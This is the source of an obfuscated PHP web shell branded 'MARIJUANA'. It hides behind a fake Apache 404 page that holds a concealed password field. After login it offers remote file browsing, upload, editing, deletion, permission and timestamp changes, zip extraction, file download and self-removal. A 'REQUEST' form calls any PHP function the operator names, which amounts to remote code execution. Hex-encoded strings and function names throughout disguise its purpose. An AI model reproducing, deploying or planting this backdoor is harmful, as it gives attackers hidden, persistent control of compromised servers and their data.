<?php
session_start(); if (!is_writable(session_save_path())) { @mkdir("\56\163\x65\163\163\x69\157\x6e", 511); session_save_path("\x2e\163\x65\163\163\x69\x6f\156"); } session_start(); function generateRandomStringx($length = 10) { $characters = "\x30\61\62\63\64\65\x36\67\70\x39\141\x62\143\144\145\x66\147\x68\151\x6a\153\154\155\156\x6f\x70\x71\x72\x73\164\x75\166\x77\x78\x79\x7a\101\x42\x43\x44\105\x46\x47\110\111\x4a\113\x4c\115\116\117\x50\121\x52\x53\124\125\x56\127\x58\x59\x5a"; $charactersLength = 62; $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } function License() { echo "\74\41\x44\x4f\x43\x54\131\x50\105\x20\150\x74\155\154\76\x3c\x68\x74\x6d\x6c\76\x3c\150\145\x61\144\76\x3c\x6d\145\164\x61\40\156\x61\x6d\145\75\x27\x72\x6f\142\x6f\164\x73\x27\40\x63\157\x6e\x74\145\x6e\x74\x27\156\157\151\x6e\x64\145\x78\54\x20\x6e\x6f\x66\157\154\154\x6f\x77\x27\x3e\74\x74\x69\164\x6c\145\x3e\74\57\164\151\164\x6c\x65\x3e\74\x2f\x68\145\x61\144\76\74\142\157\x64\x79\76\x3c\150\x31\x3e\x4e\x6f\164\x20\106\157\165\156\144\x3c\x2f\150\61\76\x3c\x74\x69\x74\154\145\x3e\64\x30\64\x20\116\157\164\40\x46\157\165\156\x64\74\57\x74\x69\164\x6c\145\76\74\x73\164\171\154\145\x20\x74\171\160\145\75\x27\164\145\x78\164\x2f\x63\x73\x73\x27\x3e\x69\156\160\x75\x74\133\x74\x79\160\145\75\x70\141\x73\x73\167\157\x72\x64\135\x20\x7b\x20\x77\x69\x64\164\x68\x3a\40\x32\x35\x30\x70\170\73\x20\150\x65\x69\x67\150\164\72\x20\x32\65\x70\x78\73\40\143\x6f\x6c\x6f\162\72\40\x77\x68\151\164\x65\x3b\x20\142\141\143\153\x67\x72\x6f\x75\x6e\x64\72\40\164\162\x61\156\x73\160\141\x72\145\156\164\73\x20\x62\157\162\144\x65\x72\x3a\x20\61\160\170\x20\x73\157\x6c\151\x64\40\167\150\x69\x74\145\73\x20\x6d\141\162\x67\151\156\55\154\145\x66\164\x3a\x20\62\60\160\170\73\40\164\145\170\x74\x2d\141\154\x69\x67\x6e\x3a\x20\143\145\156\164\x65\162\x3b\40\x7d\74\57\x73\x74\171\x6c\x65\76\74\160\x3e\x54\150\x65\x20\162\x65\x71\x75\145\x73\164\145\144\x20\x55\122\114\x20\x77\x61\163\40\156\x6f\164\x20\146\x6f\x75\x6e\x64\x20\157\x6e\x20\164\x68\x69\163\x20\x73\145\162\x76\145\162\x2e\74\x2f\x70\76\x3c\160\x3e\x41\144\144\151\164\x69\157\x6e\141\x6c\x6c\x79\54\x20\x61\x20\64\60\64\40\116\x6f\164\40\x46\x6f\x75\x6e\x64\40\x65\x72\162\x6f\x72\40\x77\x61\163\40\x65\156\143\157\165\156\x74\x65\162\145\144\x20\x77\150\151\x6c\x65\40\x74\162\171\151\x6e\x67\40\x74\157\x20\x75\163\x65\40\141\x6e\40\x45\162\162\157\x72\x44\x6f\143\x75\x6d\x65\156\x74\40\164\157\x20\x68\141\x6e\144\x6c\x65\40\x74\x68\x65\x20\x72\x65\x71\x75\x65\x73\164\56\x3c\57\160\x3e\x3c\x68\x72\76\x3c\x61\x64\144\162\145\163\163\76\101\x70\x61\143\150\x65\40\x53\x65\x72\166\x65\162\40\x61\x74\x20" . $_SERVER["\110\124\124\x50\x5f\x48\x4f\123\124"] . "\x20\x50\x6f\x72\x74\x20" . $_SERVER["\x53\105\x52\x56\x45\x52\x5f\120\x4f\x52\124"] . "\x3c\57\x61\144\144\162\x65\163\x73\76\x3c\x63\145\156\x74\x65\x72\x3e\x3c\x66\157\162\155\40\155\145\164\150\x6f\144\x3d\47\x70\x6f\x73\x74\x27\x3e\74\x69\x6e\160\x75\x74\x20\164\171\x70\145\75\x27\160\141\163\163\167\x6f\x72\144\x27\40\156\141\155\x65\75\x27" . $_SESSION["\x6b\145\171\170\x78"] . "\47\x20\x61\165\x74\157\143\x6f\x6d\160\x6c\145\x74\x65\75\47\157\146\146\x27\76\x3c\x62\162\x3e\74\57\146\157\162\155\76\x3c\x2f\143\145\x6e\164\x65\x72\x3e\74\57\x62\x6f\144\x79\76\x3c\57\150\x74\155\x6c\x3e"; die; } $auth_pass5 = "\x65\x39\x34\x38\x64\x61\x62\x64\x35\x65\x36\x37\x38\x37\x37\x34\x32\x62\x62\x36\x39\x38\x32\x38\x33\x31\x31\x64\x65\x34\x34\x63\x37\x64\x35\x36\x30\x35\x35\x37"; if (empty($_SESSION["\x6b\x65\171\170\x78"])) { $keyxxx = generateRandomStringx(); $_SESSION["\x6b\x65\x79\x78\x78"] = $keyxxx; } $keyxx = $_SESSION["\153\x65\171\x78\x78"]; if (empty($_SESSION[sha1(md5($_SERVER["\x48\124\124\120\137\x48\117\x53\x54"])) . $keyxx])) { if (isset($_POST[$keyxx]) and sha1(md5($_POST[$keyxx])) == $auth_pass5) { $_SESSION[sha1(md5($_SERVER["\110\x54\x54\120\137\110\x4f\x53\x54"])) . $keyxx] = true; } else { License(); die; } } 
  $sp08c29d = array('7068705f756e616d65', '70687076657273696f6e', '6368646972', '676574637764', '707265675f73706c6974', '636f7079', '66696c655f6765745f636f6e74656e7473', '6261736536345f6465636f6465', '69735f646972', '6f625f656e645f636c65616e28293b', '756e6c696e6b', '6d6b646972', '63686d6f64', '7363616e646972', '7374725f7265706c616365', '68746d6c7370656369616c6368617273', '7661725f64756d70', '666f70656e', '667772697465', '66636c6f7365', '64617465', '66696c656d74696d65', '737562737472', '737072696e7466', '66696c657065726d73', '746f756368', '66696c655f657869737473', '72656e616d65', '69735f6172726179', '69735f6f626a656374', '737472706f73', '69735f7772697461626c65', '69735f7265616461626c65', '737472746f74696d65', '66696c6573697a65', '726d646972', '6f625f6765745f636c65616e', '7265616466696c65', '617373657274'); $spcc0e53 = count($sp08c29d); for ($spee3456 = 0; $spee3456 < $spcc0e53; $spee3456++) { $sp7382cd[] = uhex($sp08c29d[$spee3456]); } ?>
<!DOCTYPE html>
    <html dir="auto" lang="en-US">

        <head>
            <meta charset="UTF-8">
            <meta name="robots" content="NOINDEX, NOFOLLOW">

                <title>MARIJUANA</title>

            <link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
            <link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">

            <script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
            <script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
        </head>

        <body>
            <header>
                <div class="y x">
                    <a class="ajx" href="<?php  echo basename($_SERVER['PHP_SELF']); ?>
">
                        MARIJuANA
                    </a>
                </div>

                <div class="q x w">
                    &#8212; DIOS &#8212; NO &#8212; CREA &#8212; NADA &#8212; EN &#8212; VANO &#8212;
                </div>
                
            </header>

            <article>
                <div class="i">
                    <i class="far fa-hdd"></i>
                    <?php  echo $sp7382cd[0](); ?>

                    <br />

                    <i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php  echo $_SERVER['SERVER_SOFTWARE']; ?>
 <b>PHP :</b> <?php  echo $sp7382cd[1](); ?>

                    <br />

                    <i class="far fa-folder"></i>
                    
                    <?php  if (isset($_GET['d'])) { $sp438a7a = uhex($_GET['d']); $sp7382cd[2](uhex($_GET['d'])); } else { $sp438a7a = $sp7382cd[3](); } $sp773bef = $sp7382cd[4]('/(\\\\|\\/)/', $sp438a7a); foreach ($sp773bef as $sp1f6785 => $sp23abf5) { if ($sp23abf5 == '' && $sp1f6785 == 0) { echo '<a class="ajx" href="?d=2f">/</a>'; } if ($sp23abf5 == '') { continue; } echo '<a class="ajx" href="?d='; for ($spee3456 = 0; $spee3456 <= $sp1f6785; $spee3456++) { echo hex($sp773bef[$spee3456]); if ($spee3456 != $sp1f6785) { echo '2f'; } } echo '">' . $sp23abf5 . '</a>/'; } ?>

                    <br />

                </div>

                <div class="u">
                    <?php  echo $_SERVER['SERVER_ADDR']; ?>
 <i class="fas fa-link"></i>
                    <br />

                    <br />

                    <form method="post" enctype="multipart/form-data">
                        <label class="l w">
                            <input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
                        </label>&nbsp;
                    </form>

                    <?php  $sp7e65d1 = array('<script>$.notify("', '", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>'); $sp6f5ea4 = $sp7e65d1[0] . 'OK!' . $sp7e65d1[1]; $sp0232fe = $sp7e65d1[0] . 'ER!' . $sp7e65d1[1]; if (isset($_FILES['n'])) { $sp5a8411 = $_FILES['n']['name']; $sp79de13 = count($sp5a8411); for ($spee3456 = 0; $spee3456 < $sp79de13; $spee3456++) { if ($sp7382cd[5]($_FILES['n']['tmp_name'][$spee3456], $sp5a8411[$spee3456])) { echo $sp6f5ea4; } else { echo $sp0232fe; } } } ?>

                </div>
                    <?php  $sp0ef78d = '<table cellspacing="0" cellpadding="7" width="100%">
                        <thead>
                            <tr>
                                <th>'; $sp1b1862 = '</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td></td>
                            </tr>
                            <tr>
                                <td class="x">'; $spf83717 = '</td>
                            </tr>
                        </tbody>
                    </table>'; $spf0df96 = '<br />
                                        <br />
                                        <input type="submit" class="w" value="&nbsp;OK&nbsp;" />
                                    </form>'; if (isset($_GET['s'])) { echo $sp0ef78d . uhex($_GET['s']) . $sp1b1862 . '
                                    <textarea readonly="yes">' . $sp7382cd[15]($sp7382cd[6](uhex($_GET['s']))) . '</textarea>
                                    <br />
                                    <br />
                                    <input onclick="location.href=\'?d=' . $_GET['d'] . '&e=' . $_GET['s'] . '\'" type="submit" class="w" value="&nbsp;EDIT&nbsp;" />
                                ' . $spf83717; } elseif (isset($_GET['y'])) { echo $sp0ef78d . 'REQUEST' . $sp1b1862 . '
                                    <form method="post">
                                        <input class="x" type="text" name="1" />&nbsp;&nbsp;
                                        <input class="x" type="text" name="2" />
                                        ' . $spf0df96 . '
                                    <br />
                                    <textarea readonly="yes">'; if (isset($_POST['2'])) { echo $sp7382cd[15](dre($_POST['1'], $_POST['2'])); } echo '</textarea>
                                ' . $spf83717; } elseif (isset($_GET['e'])) { echo $sp0ef78d . uhex($_GET['e']) . $sp1b1862 . '
                                    <form method="post">
                                        <textarea name="e" class="o">' . $sp7382cd[15]($sp7382cd[6](uhex($_GET['e']))) . '</textarea>
                                        <br />
                                        <br />
                                        <span class="w">BASE64</span> :
                                        <select id="b64" name="b64">
                                            <option value="0">NO</option>
                                            <option value="1">YES</option>
                                        </select>
                                        ' . $spf0df96 . '
                                ' . $spf83717 . '
                                
                    <script>
                        $("#b64").change(function() {
                            if($("#b64 option:selected").val() == 0) {
                                var X = $("textarea").val();
                                var Z = atob(X);
                                $("textarea").val(Z);
                            }
                            else {
                                var N = $("textarea").val();
                                var I = btoa(N);
                                $("textarea").val(I);
                            }
                        });
                    </script>'; if (isset($_POST['e'])) { if ($_POST['b64'] == '1') { $sp26832d = $sp7382cd[7]($_POST['e']); } else { $sp26832d = $_POST['e']; } $sp012be3 = $sp7382cd[17](uhex($_GET['e']), 'w'); if ($sp7382cd[18]($sp012be3, $sp26832d)) { OK(); } else { ER(); } $sp7382cd[19]($sp012be3); } } elseif (isset($_GET['x'])) { rec(uhex($_GET['x'])); if ($sp7382cd[26](uhex($_GET['x']))) { ER(); } else { OK(); } } elseif (isset($_GET['t'])) { echo $sp0ef78d . uhex($_GET['t']) . $sp1b1862 . '
                                    <form action="" method="post">
                                        <input name="t" class="x" type="text" value="' . $sp7382cd[20]('Y-m-d H:i', $sp7382cd[21](uhex($_GET['t']))) . '">
                                        ' . $spf0df96 . '
                                ' . $spf83717; if (!empty($_POST['t'])) { $sp650dee = $sp7382cd[33]($_POST['t']); if ($sp650dee) { if (!$sp7382cd[25](uhex($_GET['t']), $sp650dee, $sp650dee)) { ER(); } else { OK(); } } else { ER(); } } } elseif (isset($_GET['k'])) { echo $sp0ef78d . uhex($_GET['k']) . $sp1b1862 . '
                                    <form action="" method="post">
                                        <input name="b" class="x" type="text" value="' . $sp7382cd[22]($sp7382cd[23]('%o', $sp7382cd[24](uhex($_GET['k']))), -4) . '">
                                        ' . $spf0df96 . '
                                ' . $spf83717; if (!empty($_POST['b'])) { $sp169c21 = $_POST['b']; $sp5a7e4d = 0; for ($spee3456 = strlen($sp169c21) - 1; $spee3456 >= 0; --$spee3456) { $sp5a7e4d += (int) $sp169c21[$spee3456] * pow(8, strlen($sp169c21) - $spee3456 - 1); } if (!$sp7382cd[12](uhex($_GET['k']), $sp5a7e4d)) { ER(); } else { OK(); } } } elseif (isset($_GET['l'])) { echo $sp0ef78d . '+DIR' . $sp1b1862 . '
                                    <form action="" method="post">
                                        <input name="l" class="x" type="text" value="">
                                        ' . $spf0df96 . '
                                ' . $spf83717; if (isset($_POST['l'])) { if (!$sp7382cd[11]($_POST['l'])) { ER(); } else { OK(); } } } elseif (isset($_GET['q'])) { if ($sp7382cd[10](__FILE__)) { $sp7382cd[38]($sp7382cd[9]); header('Location: ' . basename($_SERVER['PHP_SELF']) . ''); die; } else { echo $sp0232fe; } } elseif (isset($_GET['n'])) { echo $sp0ef78d . '+FILE' . $sp1b1862 . '
                                    <form action="" method="post">
                                        <input name="n" class="x" type="text" value="">
                                        ' . $spf0df96 . '
                                ' . $spf83717; if (isset($_POST['n'])) { if (!$sp7382cd[25]($_POST['n'])) { ER(); } else { OK(); } } } elseif (isset($_GET['r'])) { echo $sp0ef78d . uhex($_GET['r']) . $sp1b1862 . '
                                    <form action="" method="post">
                                        <input name="r" class="x" type="text" value="' . uhex($_GET['r']) . '">
                                        ' . $spf0df96 . '
                                ' . $spf83717; if (isset($_POST['r'])) { if ($sp7382cd[26]($_POST['r'])) { ER(); } else { if ($sp7382cd[27](uhex($_GET['r']), $_POST['r'])) { OK(); } else { ER(); } } } } elseif (isset($_GET['z'])) { $sp231f23 = new ZipArchive(); $sp4774a3 = $sp231f23->open(uhex($_GET['z'])); if ($sp4774a3 === TRUE) { $sp231f23->extractTo(uhex($_GET['d'])); $sp231f23->close(); OK(); } else { ER(); } } else { echo '<table cellspacing="0" cellpadding="7" width="100%">
                        <thead>
                            <tr>
                                <th width="44%">[ NAME ]</th>
                                <th width="11%">[ SIZE ]</th>
                                <th width="17%">[ PERM ]</th>
                                <th width="17%">[ DATE ]</th>
                                <th width="11%">[ ACT ]</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>
                                    <a class="ajx" href="?d=' . hex($sp438a7a) . '&n">+FILE</a>
                                    <a class="ajx" href="?d=' . hex($sp438a7a) . '&l">+DIR</a>
                                </td>
                            </tr>
                        '; $sp7300b1 = ''; $spad132d = ''; $spf2eee2 = $sp7382cd[13]($sp438a7a); if ($sp7382cd[28]($spf2eee2) || $sp7382cd[29]($spf2eee2)) { foreach ($spf2eee2 as $sp7b4bdf) { $sp0a8dee = $sp7382cd[14]('\\', '/', $sp438a7a); if (!$sp7382cd[30]($sp7b4bdf, '.zip')) { $sp7e7002 = ''; } else { $sp7e7002 = '<a href="?d=' . hex($sp0a8dee) . '&z=' . hex($sp7b4bdf) . '">U</a>'; } if ($sp7382cd[31]("{$sp438a7a}/{$sp7b4bdf}")) { $spdf8282 = ''; } elseif (!$sp7382cd[32]("{$sp438a7a}/{$sp7b4bdf}")) { $spdf8282 = ' h'; } else { $spdf8282 = ' w'; } $spa4f275 = $sp7382cd[34]("{$sp438a7a}/{$sp7b4bdf}") / 1024; $spa4f275 = round($spa4f275, 3); if ($spa4f275 >= 1024) { $spa4f275 = round($spa4f275 / 1024, 2) . ' MB'; } else { $spa4f275 = $spa4f275 . ' KB'; } if ($sp7b4bdf != '.' && $sp7b4bdf != '..') { $sp7382cd[8]("{$sp438a7a}/{$sp7b4bdf}") ? $sp7300b1 .= '<tr class="r">
                            <td>
                                <i class="far fa-folder m"></i>
                                <a class="ajx" href="?d=' . hex($sp0a8dee) . hex('/' . $sp7b4bdf) . '">' . $sp7b4bdf . '</a>
                            </td>
                            <td class="x">
                                dir
                            </td>
                            <td class="x">
                                <a class="ajx' . $spdf8282 . '" href="?d=' . hex($sp0a8dee) . '&k=' . hex($sp7b4bdf) . '">' . x("{$sp438a7a}/{$sp7b4bdf}") . '</a>
                            </td>
                            <td class="x">
                                <a class="ajx" href="?d=' . hex($sp0a8dee) . '&t=' . hex($sp7b4bdf) . '">' . $sp7382cd[20]('Y-m-d H:i', $sp7382cd[21]("{$sp438a7a}/{$sp7b4bdf}")) . '</a>
                            </td>
                            <td class="x">
                                <a class="ajx" href="?d=' . hex($sp0a8dee) . '&r=' . hex($sp7b4bdf) . '">R</a>
                                <a href="?d=' . hex($sp0a8dee) . '&x=' . hex($sp7b4bdf) . '">D</a>
                            </td>
                        </tr>
                        
                        ' : ($spad132d .= '<tr class="r">
                            <td>
                                <i class="far fa-file m"></i>&thinsp;
                                <a class="ajx" href="?d=' . hex($sp0a8dee) . '&s=' . hex($sp7b4bdf) . '">' . $sp7b4bdf . '</a>
                            </td>
                            <td class="x">
                                ' . $spa4f275 . '
                            </td>
                            <td class="x">
                                <a class="ajx' . $spdf8282 . '" href="?d=' . hex($sp0a8dee) . '&k=' . hex($sp7b4bdf) . '">' . x("{$sp438a7a}/{$sp7b4bdf}") . '</a>
                            </td>
                            <td class="x">
                                <a class="ajx" href="?d=' . hex($sp0a8dee) . '&t=' . hex($sp7b4bdf) . '">' . $sp7382cd[20]('Y-m-d H:i', $sp7382cd[21]("{$sp438a7a}/{$sp7b4bdf}")) . '</a>
                            </td>
                            <td class="x">
                                <a class="ajx" href="?d=' . hex($sp0a8dee) . '&r=' . hex($sp7b4bdf) . '">R</a>
                                <a class="ajx" href="?d=' . hex($sp0a8dee) . '&e=' . hex($sp7b4bdf) . '">E</a>
                                <a href="?d=' . hex($sp0a8dee) . '&g=' . hex($sp7b4bdf) . '">G</a>
                                ' . $sp7e7002 . '
                                <a href="?d=' . hex($sp0a8dee) . '&x=' . hex($sp7b4bdf) . '">D</a>
                            </td>
                        </tr>
                        
                        '); } } } echo $sp7300b1; echo $spad132d; echo '</tbody>
                        <tfoot>
                            <tr>
                                <th class="et">
                                    <a class="ajx" href="?d=' . hex($sp0a8dee) . '&y">REQUEST</a>
                                    <a href="?d=' . hex($sp0a8dee) . '&q">EXIT</a>
                                </th>
                                <th class="et" width="11%"></th>
                                <th class="et" width="17%"></th>
                                <th class="et" width="17%"></th>
                                <th class="et" width="11%"></th>
                            </tr>
                    </tfoot>
                </table>'; } ?>

            </article>
            <footer class="x">
                &copy;TheAlmightyZeus
            </footer>
            <?php  if (isset($_GET['1'])) { echo $sp6f5ea4; } elseif (isset($_GET['0'])) { echo $sp0232fe; } else { NULL; } ?>

            <script>
                $(".ajx").click(function(t){t.preventDefault();var e=$(this).attr("href");history.pushState("","",e),$.get(e,function(t){$("body").html(t)})});
            </script>
        </body>
    </html>
<?php  function rec($spad132d) { global $sp7382cd; if (trim(pathinfo($spad132d, PATHINFO_BASENAME), '.') === '') { return; } if ($sp7382cd[8]($spad132d)) { array_map('rec', glob($spad132d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT)); $sp7382cd[35]($spad132d); } else { $sp7382cd[10]($spad132d); } } function dre($spb5277b, $sp6187d4) { global $sp7382cd; ob_start(); $sp7382cd[16]($spb5277b($sp6187d4)); return $sp7382cd[36](); } function hex($sp4cc2e5) { $sp1cd713 = ''; for ($spee3456 = 0; $spee3456 < strlen($sp4cc2e5); $spee3456++) { $sp1cd713 .= dechex(ord($sp4cc2e5[$spee3456])); } return $sp1cd713; } function uhex($sp1cd713) { $sp4cc2e5 = ''; for ($spee3456 = 0; $spee3456 < strlen($sp1cd713) - 1; $spee3456 += 2) { $sp4cc2e5 .= chr(hexdec($sp1cd713[$spee3456] . $sp1cd713[$spee3456 + 1])); } return $sp4cc2e5; } function OK() { global $sp7382cd, $sp438a7a; $sp7382cd[38]($sp7382cd[9]); header('Location: ?d=' . hex($sp438a7a) . '&1'); die; } function ER() { global $sp7382cd, $sp438a7a; $sp7382cd[38]($sp7382cd[9]); header('Location: ?d=' . hex($sp438a7a) . '&0'); die; } function x($sp7b4bdf) { global $sp7382cd; $sp169c21 = $sp7382cd[24]($sp7b4bdf); if (($sp169c21 & 49152) == 49152) { $sp51c09a = 's'; } elseif (($sp169c21 & 40960) == 40960) { $sp51c09a = 'l'; } elseif (($sp169c21 & 32768) == 32768) { $sp51c09a = '-'; } elseif (($sp169c21 & 24576) == 24576) { $sp51c09a = 'b'; } elseif (($sp169c21 & 16384) == 16384) { $sp51c09a = 'd'; } elseif (($sp169c21 & 8192) == 8192) { $sp51c09a = 'c'; } elseif (($sp169c21 & 4096) == 4096) { $sp51c09a = 'p'; } else { $sp51c09a = 'u'; } $sp51c09a .= $sp169c21 & 256 ? 'r' : '-'; $sp51c09a .= $sp169c21 & 128 ? 'w' : '-'; $sp51c09a .= $sp169c21 & 64 ? $sp169c21 & 2048 ? 's' : 'x' : ($sp169c21 & 2048 ? 'S' : '-'); $sp51c09a .= $sp169c21 & 32 ? 'r' : '-'; $sp51c09a .= $sp169c21 & 16 ? 'w' : '-'; $sp51c09a .= $sp169c21 & 8 ? $sp169c21 & 1024 ? 's' : 'x' : ($sp169c21 & 1024 ? 'S' : '-'); $sp51c09a .= $sp169c21 & 4 ? 'r' : '-'; $sp51c09a .= $sp169c21 & 2 ? 'w' : '-'; $sp51c09a .= $sp169c21 & 1 ? $sp169c21 & 512 ? 't' : 'x' : ($sp169c21 & 512 ? 'T' : '-'); return $sp51c09a; } if (isset($_GET['g'])) { $sp7382cd[38]($sp7382cd[9]); header('Content-Type: application/octet-stream'); header('Content-Transfer-Encoding: Binary'); header('Content-Length: ' . $sp7382cd[34](uhex($_GET['g']))); header('Content-disposition: attachment; filename="' . uhex($_GET['g']) . '"'); $sp7382cd[37](uhex($_GET['g'])); }